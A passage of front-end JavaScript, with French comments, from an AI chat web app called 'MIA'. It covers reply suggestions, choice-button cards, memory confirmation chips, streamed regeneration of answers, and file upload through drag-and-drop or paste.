    if (live && !live.done) return null;
    const inline = inlineControllers.get(cid);
    if (inline && !inline.done) return null;
    for (const job of activeJobs.values()) {
        if (!job.done && String(job.convId) === cid) return null;
    }
    if (pendingBatchCards().length > 0 || wrap.querySelector('.mail-draft-card:not(.is-done):not(.is-cancelled):not(.is-failed) .drive-confirm-actions')) return null;
    return last;
}

function syncComposerSuggestion() {
    const hints = window.MiaComposerHints;
    if (!hints || typeof hints.setSuggestion !== 'function') return;
    const target = window.COMPOSER_SUGGEST && !document.body.classList.contains('voice-chat-on')
        ? composerSuggestionTarget() : null;
    if (!target) { hints.setSuggestion(null); return; }
    if (typeof target.dataset.suggestion === 'string') { hints.setSuggestion(target.dataset.suggestion); return; }

    hints.setSuggestion(null);
    const msgId = String(target.dataset.messageId);
    const cid = String(convId() || '');
    if (composerSuggestionAsked.has(msgId)) return;
    composerSuggestionAsked.add(msgId);
    const fd = new FormData();
    fd.append('message_id', msgId);
    // Appel de fond : une session expirée ou une panne ne disent rien (la
    // suggestion manque, c'est tout).
    fetch(`/chat/${cid}/suggest`, { method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd })
        .then(r => (r.ok ? r.json() : null))
        .then(data => {
            if (!data) return;
            // Une suggestion préparée a coûté quelques crédits : le total de
            // la conversation et le solde le disent tout de suite.
            if (String(convId() || '') === cid && data.conversation_credits_total !== undefined) {
                applyConversationCreditsTotal(data.conversation_credits_total);
                applyQuotaStatus(data.quota_status || null);
            }
            if (typeof data.suggestion !== 'string') return;
            target.dataset.suggestion = data.suggestion;
            if (String(convId() || '') === cid) syncComposerSuggestion();
        })
        .catch(() => {});
}
window.syncComposerSuggestion = syncComposerSuggestion;

/**
 * Choix proposés en boutons (choice-buttons.js) : état de chaque carte du fil.
 *
 * Une carte n'est ACTIVE que si personne n'y a encore répondu — aucun message
 * de l'utilisateur après elle —, que sa réponse est finie (bloc refermé, plus
 * rien ne s'écrit dans la conversation) et qu'aucune réponse plus récente ne
 * porte d'autres choix. Sinon elle reste lisible, inerte, l'option envoyée
 * cochée. Appelée après chaque message ajouté (appendMessage) et aux mêmes
 * moments que le bouton « Continuer » ; sans carte dans le fil, elle ne coûte
 * qu'une requête DOM.
 */
function syncChoicePrompts() {
    const wrap = document.getElementById('chatMessages');
    if (!wrap || !window.MiaChoices) return;
    const cards = wrap.querySelectorAll('.choice-card');
    if (!cards.length) return;

    const messages = Array.from(wrap.querySelectorAll(':scope > .message'));
    const live = activeStreams.get(String(convId() || ''));
    const writing = !!(live && !live.done);
    const lastMessageWithChoices = cards[cards.length - 1].closest('.message');

    cards.forEach(card => {
        // Une carte DANS l'aperçu d'un fichier livré n'est pas une question posée.
        if (card.closest('.file-card')) return;
        const msg = card.closest('.message');
        const content = card.closest('.msg-content');
        let answer = null;
        for (let i = messages.indexOf(msg) + 1; i > 0 && i < messages.length; i++) {
            if (messages[i].classList.contains('message-user')) { answer = messages[i]; break; }
        }

        let state;
        if (answer) state = 'answered';
        else if (content && content.classList.contains('streaming')) state = 'pending';
        else if (card.dataset.closed !== '1') state = 'incomplete';
        else if (msg !== lastMessageWithChoices) state = 'superseded';
        else if (writing) state = 'pending';
        else state = card.dataset.state === 'sending' ? 'sending' : 'live';

        const answerText = answer ? (answer.querySelector('.msg-content')?.textContent || '') : '';
        window.MiaChoices.applyState(card, state, answerText);
    });
}

/**
 * Un choix touché : son libellé (ou, choix multiple, les libellés retenus, un
 * par ligne) part comme un message ordinaire — le serveur ne fait aucune
 * différence avec un message tapé. Le brouillon du composer est conservé.
 */
async function sendChoiceAnswer(card, chosen) {
    const values = chosen.map(o => String(o.dataset.value || '').trim()).filter(Boolean);
    if (!values.length || card.dataset.state !== 'live') return;

    const draft = msgInput.value;
    chosen.forEach(o => o.classList.add('is-chosen'));
    window.MiaChoices.applyState(card, 'sending');
    try {
        await submitForm({ text: values.join('\n') });
    } finally {
        // Les outils de génération vident le champ en partant : le brouillon
        // tapé avant le clic n'avait rien à voir avec le choix.
        if (draft.trim() !== '' && msgInput.value === '') {
            msgInput.value = draft;
            msgInput.dispatchEvent(new Event('input', { bubbles: true }));
        }
        // Refusé avant l'envoi (session expirée, création impossible) : rien
        // n'est parti, la carte redevient active. Sinon le message de
        // l'utilisateur, déjà dans le fil, la clôt.
        delete card.dataset.state;
        syncChoicePrompts();
    }
}

chatMsgs?.addEventListener('click', (e) => {
    const card = e.target.closest('.choice-card');
    if (!card || !window.MiaChoices || card.dataset.state !== 'live') return;

    const option = e.target.closest('.choice-option');
    if (option) {
        e.preventDefault();
        if (card.dataset.multiple === '1') window.MiaChoices.toggle(card, option);
        else sendChoiceAnswer(card, [option]);
        return;
    }
    if (e.target.closest('.choice-submit')) {
        e.preventDefault();
        sendChoiceAnswer(card, window.MiaChoices.selected(card));
        return;
    }
    if (e.target.closest('.choice-other')) {
        e.preventDefault();
        msgInput.focus();
    }
});

chatMsgs?.addEventListener('keydown', (e) => {
    const card = e.target.closest?.('.choice-card');
    if (card && window.MiaChoices?.handleKey(card, e)) e.preventDefault();
});

/**
 * Pastille « MIA pour vous » : confirme visuellement ce qui vient d'être ajouté
 * à la mémoire long terme. Posée sous la bulle (hors .msg-content, re-rendu à
 * chaque delta markdown, qui l'écraserait). Éphémère : la confirmation durable
 * est dans le texte de la réponse, persisté en base.
 * payload = {faits: [...], doublons: n, plein: bool}
 */
function renderMemoryChip(bodyEl, payload) {
    if (!bodyEl || !payload) return;
    const faits = Array.isArray(payload.faits) ? payload.faits : [];
    if (faits.length === 0 && !payload.plein) return;

    const chip = document.createElement('div');
    chip.className = 'memory-chip';
    const icon = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" '
        + 'stroke-width="2" stroke-linecap="round" stroke-linejoin="round">'
        + '<path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"/></svg>';

    const title = document.createElement('div');
    title.className = 'memory-chip-title';
    // `titre`/`lien` : la même pastille sert la mémoire long terme et les
    // règles d'organisation des tâches, qui ne se gèrent pas au même endroit.
    // Absents = mémoire long terme, le cas d'origine.
    const titreOk = String(payload.titre || t('Ajouté à « MIA pour vous »'));
    title.innerHTML = icon + '<span></span>';
    title.querySelector('span').textContent = payload.plein && faits.length === 0
        ? (payload.titre ? titreOk + t(' — liste pleine, rien enregistré') : t('Mémoire pleine — rien enregistré'))
        : titreOk;
    chip.appendChild(title);

    if (faits.length > 0) {
        const list = document.createElement('ul');
        list.className = 'memory-chip-list';
        faits.forEach(fait => {
            const li = document.createElement('li');
            li.textContent = fait;
            list.appendChild(li);
        });
        chip.appendChild(list);
    }

    const link = document.createElement('a');
    link.className = 'memory-chip-link';
    // Ancre sur la carte « MIA pour vous » : la page porte trois sections,
    // le lien doit poser l'utilisateur devant la liste, pas en tête de page.
    link.href = payload.lien || '/settings/ai#memoryCard';
    link.textContent = payload.lien_texte || t('Gérer ma mémoire');
    chip.appendChild(link);

    bodyEl.appendChild(chip);
}

function buildStreamPhaseEl(phase) {
    const wrap = document.createElement('div');
    wrap.className = 'stream-phase';
    const dot = document.createElement('span');
    dot.className = 'stream-phase-dot';
    const label = document.createElement('span');
    label.className = 'stream-phase-label';
    label.textContent = STREAM_PHASE_LABELS[phase] || STREAM_PHASE_LABELS.analyzing;
    wrap.appendChild(dot);
    wrap.appendChild(label);
    return wrap;
}

function updateStreamPhase(contentEl, phase) {
    if (!contentEl) return;
    const label = contentEl.querySelector('.stream-phase-label');
    const text = STREAM_PHASE_LABELS[phase];
    if (label && text) {
        label.textContent = text;
    }
}

function finalizeAssistantMessage(contentEl) {
    contentEl.__streamRenderFinalized = true;
    contentEl.classList.remove('streaming');
    contentEl.querySelector('.stream-phase')?.remove();
    const raw = contentEl.dataset.raw || '';

    // Erreur API : on rend un bloc d'erreur propre (jamais de markdown brut).
    let errPayload = null;
    if (contentEl.dataset.errorPayload) {
        try { errPayload = JSON.parse(contentEl.dataset.errorPayload); } catch (_) {}
    } else if (looksLikeErrorMessage(raw)) {
        errPayload = errorPayloadFromText(raw);
    }
    if (errPayload) {
        const mdErr = contentEl.querySelector('.md-render');
        if (mdErr) mdErr.innerHTML = buildErrorBlockHtml(errPayload);
        contentEl.dataset.errorBlock = '1';
        refreshAssistantActions(contentEl.closest('.message'));
        scrollBottom();
        return;
    }

    const mdEl = contentEl.querySelector('.md-render');
    if (mdEl) {
        mdEl.innerHTML = renderMarkdown(raw);
        hydrateGeneratedFiles(mdEl);
        initCodeCopyBtns(contentEl);
        renderMermaidBlocks(contentEl);
    }
    // Image-only assistant message → swap "Exporter PDF" pour "Sauvegarder"
    refreshAssistantActions(contentEl.closest('.message'));
    if (isSonarProConversation()) {
        const messageEl = contentEl.closest('.message');
        if (messageEl) openSourcesViewerForMessage(messageEl);
    }
    scrollBottom();
}

// Clic hors d'un message utilisateur : referme les boutons Copier révélés.
document.addEventListener('click', e => {
    if (e.target.closest('.message-user')) return;
    document.querySelectorAll('.message-user.show-actions')
        .forEach(m => m.classList.remove('show-actions'));
});

// ---- Copier / Regénérer / Sauvegarder ----
document.getElementById('chatMessages')?.addEventListener('click', async e => {
    // Dépliage de la trace d'actions (« +N autres actions ») : pur DOM, pas
    // de re-rendu — les lignes repliées sont déjà là, juste masquées.
    const traceMoreBtn = e.target.closest('.msg-trace-more');
    if (traceMoreBtn) {
        const trace = traceMoreBtn.closest('.msg-trace');
        if (trace) {
            trace.classList.add('expanded');
            trace.querySelectorAll('.msg-trace-row[hidden]').forEach(r => { r.hidden = false; });
        }
        traceMoreBtn.remove();
        return;
    }

    // « Refaire en workflow » : le plan de CETTE réponse, une fois enregistrée.
    const planToWorkflow = e.target.closest('.msg-plan-workflow');
    if (planToWorkflow) {
        const messageId = planToWorkflow.closest('.message')?.dataset?.messageId;
        e.preventDefault();
        if (messageId) window.location.href = '/workflows/new?from=' + encodeURIComponent(String(messageId));
        return;
    }

    // « Refaire régulièrement » : formulaire de tâche pré-rempli depuis CE
    // message, avec les sources cochées en ce moment dans le menu « + ».
    const scheduleBtn = e.target.closest('.btn-schedule');
    if (scheduleBtn) {
        const messageId = scheduleBtn.closest('.message')?.dataset?.messageId;
        if (!messageId) return; // réponse pas encore enregistrée
        e.preventDefault();
        window.location.href = scheduleUrlForMessage(messageId);
        return;
    }

    const copyBtn = e.target.closest('.btn-copy');
    const regenBtn = e.target.closest('.btn-regen');
    const exportPdfBtn = e.target.closest('.btn-export-pdf');
    const exportDocxBtn = e.target.closest('.btn-export-docx');
    const saveImageBtn = e.target.closest('.btn-save-image');
    const copyUserBtn = e.target.closest('.btn-copy-user');

    // Copie d'un message utilisateur (texte brut, pas de markdown à traiter)
    if (copyUserBtn) {
        const raw = copyUserBtn.closest('.message')?.querySelector('.msg-content')?.dataset?.raw || '';
        try {
            await navigator.clipboard.writeText(raw);
        } catch (_err) {
            showToast(t('Impossible de copier le message.'), 'error');
            return;
        }
        copyUserBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Copié`;
        copyUserBtn.classList.add('copied');
        setTimeout(() => {
            copyUserBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copier`;
            copyUserBtn.classList.remove('copied');
        }, 2000);
        return;
    }

    // Clic sur le texte d'un message utilisateur : révèle/masque son bouton
    // Copier (une sélection de texte en cours ne déclenche pas la bascule).
    const userContent = e.target.closest('.message-user .msg-content');
    if (userContent) {
        if (String(window.getSelection?.() || '') !== '') return;
        const msg = userContent.closest('.message');
        const wasShown = msg.classList.contains('show-actions');
        document.querySelectorAll('.message-user.show-actions')
            .forEach(m => m.classList.remove('show-actions'));
        if (!wasShown) msg.classList.add('show-actions');
        return;
    }

    if (exportPdfBtn) {
        await exportAssistantMessagePdf(exportPdfBtn);
        return;
    }

    if (exportDocxBtn) {
        await exportAssistantMessageDocx(exportDocxBtn);
        return;
    }

    if (saveImageBtn) {
        await saveAssistantImage(saveImageBtn);
        return;
    }

    if (copyBtn) {
        try {
            const copied = await copyAssistantMessage(copyBtn);
            if (!copied) {
                showToast(t('Impossible de copier le message.'), 'error');
                return;
            }
        } catch (_err) {
            showToast(t('Impossible de copier le message.'), 'error');
            return;
        }
        copyBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>Copié`;
        copyBtn.classList.add('copied');
        setTimeout(() => {
            copyBtn.innerHTML = `<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>Copier`;
            copyBtn.classList.remove('copied');
        }, 2000);
    }

    if (regenBtn) {
        const msgDiv  = regenBtn.closest('.message');
        const cid     = convId();
        if (!cid || !msgDiv) return;

        // Remplace par un placeholder streaming
        const body    = msgDiv.querySelector('.msg-body');
        const oldContent = msgDiv.querySelector('.msg-content');
        const actions    = msgDiv.querySelector('.msg-actions');
        // Place d'origine du contenu : un refus AVANT toute suppression côté
        // serveur (régénération d'image impossible) le remet exactement là.
        const oldContentNext = oldContent ? oldContent.nextSibling : null;
        if (oldContent) oldContent.remove();
        if (actions)    actions.remove();
        // La suggestion de suite visait la réponse remplacée.
        delete msgDiv.dataset.suggestion;
        window.MiaComposerHints?.setSuggestion?.(null);

        const newContent = document.createElement('div');
        newContent.className = 'msg-content streaming';
        newContent.dataset.raw = '';
        newContent.innerHTML = '<span class="md-render"></span>';
        newContent.insertBefore(buildStreamPhaseEl('analyzing'), newContent.firstChild);
        body.appendChild(newContent);

        const fd = new FormData();
        fd.append('llm', llmSelect?.value || 'openai');
        fd.append('tz', clientTimeZone());
        // Régénération d'une image : l'outil image engagé départage, côté
        // serveur, deux outils du moteur qui a produit l'image.
        if (selectedTool?.type === 'image') fd.append('tool_id', String(selectedTool.id));

        const inlineCtl = new AbortController();
        const inlineState = { controller: inlineCtl, done: false, aborted: false, el: newContent, watchdogAction: null };
        inlineControllers.set(String(cid), inlineState);
        refreshSendStopUi();

        // Même surveillance que le flux d'envoi : silence serveur → texte de
        // phase mis à jour puis interruption propre (pas de retry auto ici,
        // le bouton Regénérer reste sous la main).
        const inlineWatchdog = startStreamWatchdog(inlineState, {
            canAutoRetry: () => false,
            getRawLength: () => (newContent.dataset.raw || '').length,
            isVisible: () => true,
        });
        let sawDone = false;

        try {
            const response = await fetch(`/chat/${cid}/regenerate`, { method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd, signal: inlineCtl.signal });
            // Réponse de l'outil image : le serveur relance une IMAGE (job
            // `image`, même outil, même demande) au lieu d'un flux texte.
            // Traité AVANT guardStreamResponse, qui prendrait ce JSON pour une
            // erreur.
            const replyType = response.headers.get('Content-Type') || '';
            if (replyType.includes('application/json') && response.status !== 429) {
                const payload = await response.clone().json().catch(() => ({}));
                if (response.ok && payload.job_id) {
                    newContent.querySelector('.stream-phase')?.remove();
                    // Badge et crédits de l'ancienne image : ils ne valent plus.
                    body.querySelector('.msg-llm-badge')?.remove();
                    // Conteneur des actions, rempli à la fin du job
                    // (JOB_TYPES.image → refreshAssistantActions).
                    const jobActions = document.createElement('div');
                    jobActions.className = 'msg-actions';
                    body.appendChild(jobActions);
                    attachJob(payload.job_id, { type: 'image', convId: String(cid), el: newContent, data: payload });
                    setJobStatus(newContent, jobStatusLabel({ type: 'image', data: {} }));
                    return;
                }
                if (payload.kept) {
                    // Refus AVANT toute suppression (outil d'origine retiré,
                    // demande introuvable) : l'image est intacte, on la remet.
                    newContent.remove();
                    if (oldContent) body.insertBefore(oldContent, oldContentNext && oldContentNext.parentNode === body ? oldContentNext : null);
                    if (actions) body.appendChild(actions);
                    showToast(payload.error || t('Impossible de regénérer cette image.'), 'error');
                    return;
                }
            }
            if (response.status === 429) {
                const data = await response.clone().json().catch(() => ({}));
                if (handleQuotaExceededPayload(data)) {
                    newContent.__streamRenderFinalized = true;
                    const md = newContent.querySelector('.md-render');
                    if (md) md.textContent = t('Quota crédits mensuel atteint.');
                    newContent.classList.remove('streaming');
                    newContent.querySelector('.stream-phase')?.remove();
                    return;
                }
            }
            // Statut d'erreur ou corps non-SSE : bloc d'erreur immédiat au lieu
            // d'un placeholder qui resterait affiché indéfiniment.
            if (!(await guardStreamResponse(response, newContent))) return;
            const reader   = response.body.getReader();
            const decoder  = new TextDecoder();
            let buffer     = '';

            while (true) {
                const { done, value } = await reader.read();
                if (done) break;
                inlineState.lastEventAt = Date.now();
                buffer += decoder.decode(value, { stream: true });
                const lines = buffer.split('\n');
                buffer = lines.pop();

                for (const line of lines) {
                    if (!line.startsWith('data: ')) {
                        if (looksLikeAuthFailure(line)) {
                            try { reader.cancel(); } catch (_) {}
                            showSessionExpiredModal();
                            return;
                        }
                        continue;
                    }
                    let json;
                    try { json = JSON.parse(line.slice(6)); }
                    catch (_p) {
                        if (looksLikeAuthFailure(line)) {
                            try { reader.cancel(); } catch (_) {}
                            showSessionExpiredModal();
                            return;
                        }
                        continue;
                    }
                    if (json.error === 'session_expired' || json.authenticated === false) {
                        try { reader.cancel(); } catch (_) {}
                        showSessionExpiredModal(json.login_url || LOGIN_PATH);
                        return;
                    }
                    if (json.phase) {
                        updateStreamPhase(newContent, json.phase);
                    }
                    if (json.chunk) {
                        newContent.querySelector('.stream-phase')?.remove();
                        newContent.dataset.raw = (newContent.dataset.raw || '') + json.chunk;
                        scheduleStreamingMarkdownRender(newContent);
                    }
                    if (json.llm_fallback) {
                        announceLlmFallback(json.llm_fallback);
                    }
                    if (json.llm_error) {
                        renderInlineError(newContent, json.llm_error);
                        if (!body.querySelector('.msg-actions')) {
                            const errActions = document.createElement('div');
                            errActions.className = 'msg-actions';
                            errActions.innerHTML = buildAssistantActionsHtml(newContent.dataset?.raw || '');
                            body.appendChild(errActions);
                        }
                    }
                    if (json.done) {
                        sawDone = true;
                        // La trace affichée était celle de la réponse REMPLACÉE :
                        // elle cède la place à celle de la nouvelle (recherches
                        // dans les bases, modèle de secours) — ou disparaît.
                        if (Array.isArray(json.actions)) {
                            if (json.actions.length) {
                                renderActionTrace(body, json.actions);
                            } else {
                                body.querySelector(':scope > .msg-trace')?.remove();
                            }
                        }
                        if (json.msg_id) {
                            newContent.dataset.messageId = String(json.msg_id);
                            msgDiv.setAttribute('data-message-id', String(json.msg_id));
                        }
                        applyQuotaStatus(json.quota_status || null);
                        applyConversationCreditsTotal(json.conversation_credits_total || 0);
                        finalizeAssistantMessage(newContent);
                        // Remettre les boutons (avec choix Sauvegarder vs Exporter PDF).
                        // Sur erreur, le bloc llm_error a déjà posé les actions.
                        if (!body.querySelector('.msg-actions')) {
                            const newActions = document.createElement('div');
                            newActions.className = 'msg-actions';
                            newActions.innerHTML = buildAssistantActionsHtml(newContent.dataset?.raw || '');
                            body.appendChild(newActions);
                        }
                        applyLlmBadge(msgDiv, json.llm_badge || null, Number(json.credits ?? 0));
                    }
                }
            }

            // Flux terminé sans événement final (y compris coupure watchdog
            // pendant que la boucle se terminait) : ne jamais laisser le
            // placeholder affiché — partiel conservé, sinon erreur claire.
            if (!sawDone && !inlineState.aborted) {
                const partial = (newContent.dataset.raw || '').trim();
                if (partial !== '') {
                    newContent.dataset.raw = partial + "\n\n" + t("*[Réponse incomplète : la connexion avec le serveur s'est terminée prématurément.]*");
                    newContent.querySelector('.stream-phase')?.remove();
                    finalizeAssistantMessage(newContent);
                } else {
                    renderInlineError(newContent, {
                        kind: 'server',
                        title: t('Réponse interrompue'),
                        message: t('Le serveur a interrompu la réponse avant de commencer. Cliquez sur « Regénérer » pour réessayer.'),
                    });
                }
                if (!body.querySelector('.msg-actions')) {
                    const endActions = document.createElement('div');
                    endActions.className = 'msg-actions';
                    endActions.innerHTML = buildAssistantActionsHtml(newContent.dataset?.raw || '');
                    body.appendChild(endActions);
                }
            }
        } catch (err) {
            if (inlineState.watchdogAction === 'stall') {
                const marker = t("\n\n*[Réponse interrompue : le serveur a cessé de répondre.]*");
                const cur = newContent.dataset.raw || '';
                if (!cur.endsWith(marker)) {
                    newContent.dataset.raw = cur.trimEnd() + marker;
                }
                newContent.querySelector('.stream-phase')?.remove();
                finalizeAssistantMessage(newContent);
                if (!body.querySelector('.msg-actions')) {
                    const stallActions = document.createElement('div');
                    stallActions.className = 'msg-actions';
                    stallActions.innerHTML = buildAssistantActionsHtml(newContent.dataset?.raw || '');
                    body.appendChild(stallActions);
                }
            } else if (inlineState.watchdogAction === 'timeout') {
                renderInlineError(newContent, {
                    kind: 'server',
                    title: t('Le modèle ne répond pas'),
                    message: t('Aucune réponse du modèle. Le fournisseur rencontre probablement un incident — cliquez sur « Regénérer » pour réessayer dans quelques instants.'),
                });
                if (!body.querySelector('.msg-actions')) {
                    const timeoutActions = document.createElement('div');
                    timeoutActions.className = 'msg-actions';
                    timeoutActions.innerHTML = buildAssistantActionsHtml('');
                    body.appendChild(timeoutActions);
                }
            } else if (inlineState.aborted || (err && err.name === 'AbortError')) {
                const marker = "\n\n" + t("*[Réponse interrompue par l'utilisateur]*");
                const cur = newContent.dataset.raw || '';
                if (!cur.endsWith(marker)) {
                    newContent.dataset.raw = cur.trimEnd() + marker;
                }
                newContent.querySelector('.stream-phase')?.remove();
                finalizeAssistantMessage(newContent);
                const newActions = document.createElement('div');
                newActions.className = 'msg-actions';
                newActions.innerHTML = buildAssistantActionsHtml(newContent.dataset?.raw || '');
                body.appendChild(newActions);
            } else {
                renderInlineError(newContent, {
                    kind: 'network',
                    title: t('Connexion interrompue'),
                    message: t('La connexion au serveur a été perdue. Réessayez.'),
                });
                if (!body.querySelector('.msg-actions')) {
                    const errActions = document.createElement('div');
                    errActions.className = 'msg-actions';
                    errActions.innerHTML = buildAssistantActionsHtml(newContent.dataset?.raw || '');
                    body.appendChild(errActions);
                }
            }
        } finally {
            inlineState.done = true;
            clearInterval(inlineWatchdog);
            inlineControllers.delete(String(cid));
            refreshSendStopUi();
            // Nouvelle réponse : nouvelle suggestion de suite.
            if (sawDone && String(cid) === String(visibleConvId)) syncComposerSuggestion();
        }
    }
});

// ---- Fichiers : drag & drop, sélection, upload ----
const MAX_FILES = 10;

function handleFilesAdded(newFiles) {
    const remaining = MAX_FILES - pendingFiles.length;
    if (remaining <= 0) {
        showToast(t('Maximum {max} fichiers par message.', { max: MAX_FILES }), 'error');
        fileInput.value = '';
        return;
    }
    const list = Array.from(newFiles);
    if (list.length > remaining) {
        showToast(t('Maximum {max} fichiers par message — seuls les {n} premiers ont été ajoutés.', { max: MAX_FILES, n: remaining }), 'error');
    }
    list.slice(0, remaining).forEach(file => uploadFile(file));
    fileInput.value = '';
}

async function uploadFile(file) {
    const chip = createChip(file.name, file.type);

    // Fige le contenu en mémoire AVANT tout await réseau. Une File issue d'un
    // glisser-déposer est adossée à un jeton lié au drag que Chromium invalide
    // dès qu'on rend la main à la boucle d'événements (ex. création de
    // conversation sur l'accueil) → l'upload échouait (net::ERR_UPLOAD_FILE_CHANGED),
    // affiché à tort comme un souci de taille. Les fichiers du trombone (input)
    // ne sont pas concernés, mais recopier quelques Mo est indolore et fiabilise
    // les deux chemins. Repli sur la File d'origine si la lecture échoue.
    let toSend = file;
    try {
        const buf = await file.arrayBuffer();
        toSend = new File([buf], file.name, { type: file.type || 'application/octet-stream' });
    } catch (_) { /* File illisible : on tente quand même l'envoi d'origine */ }

    let cid = convId();
    if (!cid) {
        if (!await createConversation()) {
            chip.remove();
            if (!fileChips.querySelector('.file-chip')) fileChips.style.display = 'none';
            return;
        }
        cid = convId();
    }

    const fd = new FormData();
    fd.append('file', toSend);

    let data;
    try {
        const res = await fetch(`/chat/${cid}/upload`, { method: 'POST', headers: { 'X-CSRF-Token': csrfToken }, body: fd });
        data = await res.json();
    } catch (e) {
        chip.remove();
        if (!fileChips.querySelector('.file-chip')) fileChips.style.display = 'none';
        alert(t('Échec de l\'envoi du fichier « ') + file.name + t(' ». Réessayez.'));
        return;
    }

    if (data.error) {
        chip.remove();
        if (!fileChips.querySelector('.file-chip')) fileChips.style.display = 'none';
        alert(data.error);
        return;
    }

    const previewUrl = toSend.type.startsWith('image/') ? URL.createObjectURL(toSend) : null;
    chip.dataset.token = data.token;
    chip.querySelector('.chip-spinner')?.remove();
    if (previewUrl) {
        const thumb = chip.querySelector('.chip-thumb');
        if (thumb) { thumb.src = previewUrl; thumb.style.display = ''; }
    }

    pendingFiles.push({ token: data.token, name: data.name, type: data.type, previewUrl });
    sendBtn.disabled = false;
}

function createChip(name, type) {
    fileChips.style.display = '';

    const chip = document.createElement('div');
    chip.className = 'file-chip';

    const isImage = type.startsWith('image/');
    chip.innerHTML = `
        ${isImage ? `<img class="chip-thumb" src="" alt="" style="display:none">` : `<svg class="chip-icon" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/></svg>`}
        <span class="chip-name">${escHtml(name)}</span>
        <span class="chip-spinner"></span>
        <button type="button" class="chip-remove" title="Retirer">×</button>`;

    chip.querySelector('.chip-remove').addEventListener('click', () => {
        const token = chip.dataset.token;
        if (token) pendingFiles = pendingFiles.filter(f => f.token !== token);
        chip.remove();
        if (!fileChips.querySelector('.file-chip')) fileChips.style.display = 'none';
        if (msgInput.value.trim() === '' && pendingFiles.length === 0) sendBtn.disabled = true;
    });

    fileChips.appendChild(chip);
    return chip;
}

function clearFiles() {
    pendingFiles = [];
    fileChips.innerHTML = '';
    fileChips.style.display = 'none';
    showFilesHint('');
}

function showFilesHint(msg) {
    const hint = document.getElementById('llmFileHint');
    if (!hint) return;
    if (msg) { hint.textContent = msg; hint.style.display = ''; }
    else { hint.style.display = 'none'; hint.textContent = ''; }
}

// Sélection via le menu « + » (fichiers/photos et prise de photo mobile)
fileInput?.addEventListener('change', () => handleFilesAdded(fileInput.files));
document.getElementById('cameraInput')?.addEventListener('change', e => handleFilesAdded(e.target.files));

// Drag & drop sur la zone de saisie
(function () {
    if (!inputBox) return;
    let dragCounter = 0;

    inputBox.addEventListener('dragenter', e => {
        e.preventDefault();
        dragCounter++;
        inputBox.classList.add('drag-over');
    });

    inputBox.addEventListener('dragleave', () => {
        dragCounter--;
        if (dragCounter <= 0) { dragCounter = 0; inputBox.classList.remove('drag-over'); }
    });

    inputBox.addEventListener('dragover', e => e.preventDefault());

    inputBox.addEventListener('drop', e => {
        e.preventDefault();
        dragCounter = 0;
        inputBox.classList.remove('drag-over');
        if (e.dataTransfer.files.length > 0) handleFilesAdded(e.dataTransfer.files);
    });
})();

// Coller (Ctrl/Cmd+V) une image ou un document depuis le presse-papier dans la zone de saisie
msgInput?.addEventListener('paste', e => {
    const items = e.clipboardData?.items;
    if (!items || items.length === 0) return;

    // Extensions → MIME pour compléter quand le presse-papier omet le type
    const EXT_MIME = {
        pdf:  'application/pdf',
        txt:  'text/plain',
        md:   'text/plain',
        docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
        xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
    };
    const ALLOWED_DOC_MIMES = new Set(Object.values(EXT_MIME));

    const pastedFiles = [];
    for (const item of items) {
        if (item.kind !== 'file') continue;
        const blob = item.getAsFile();
        if (!blob) continue;

        if (item.type.startsWith('image/')) {
            // Image : comportement existant — donne un nom exploitable
            const ext  = (blob.type.split('/')[1] || 'png').split('+')[0];
            const name = blob.name && blob.name !== 'image.png'
                ? blob.name
                : 'collage-' + Date.now() + '.' + ext;
            pastedFiles.push(new File([blob], name, { type: blob.type }));
        } else {
            // Document — le type peut être vide sur certains navigateurs/OS
            let mime = item.type;
            const rawName = blob.name || '';
            if (!mime && rawName) {
                const ext = rawName.split('.').pop().toLowerCase();
                mime = EXT_MIME[ext] || '';
            }
            if (mime && ALLOWED_DOC_MIMES.has(mime)) {
                const name = rawName || ('document-' + Date.now());
                pastedFiles.push(new File([blob], name, { type: mime }));
            }
        }
    }

    if (pastedFiles.length > 0) {
        e.preventDefault();
        handleFilesAdded(pastedFiles);
    }
});

// ---- Suppression de conversation ----
// ---- Suppression de conversation (délégation — fonctionne aussi pour les convs créées dynamiquement) ----
// ---- Nouvelle conversation → page d'accueil (choix LLM / assistant), sans popup ----
// [data-new-chat] : bouton de la sidebar ET bouton « + » du header mobile.
document.querySelectorAll('[data-new-chat]').forEach(btn => {
    btn.addEventListener('click', async () => {
        if (!await ensureSessionActive()) return;
        window.location.href = '/';
    });
});

// La modale « Nouveautés » (bouton de version du pied de page) vit dans
// public/assets/js/whats-new.js — partagée avec la page À propos.

// ---- Couleur d'assistant ----
// La couleur ne teinte plus l'écran (dégradé de fond, cadre, bandeau) : elle est
// posée en variable CSS sur .chat-main et le CSS la porte sur la pilule de saisie
// et sur l'identité de l'assistant (.has-assistant, --composer-accent). Le
// serveur pose la même variable au rendu : pas de flash au chargement.
function applyProfileColor(color) {
    const main = document.querySelector('.chat-main');
    if (!main) return;
    const hex = String(color || '').trim();
    if (/^#[0-9a-fA-F]{6}$/.test(hex)) main.style.setProperty('--profile-accent', hex);
    else main.style.removeProperty('--profile-accent');
}

/**
 * Identité de l'assistant dans le composer (rangée haute de la pilule).
 * SOURCE UNIQUE du remplissage au changement de conversation : nom, avatar,
 * description, modèle + version, outils, bases, bouton Modifier, et la classe
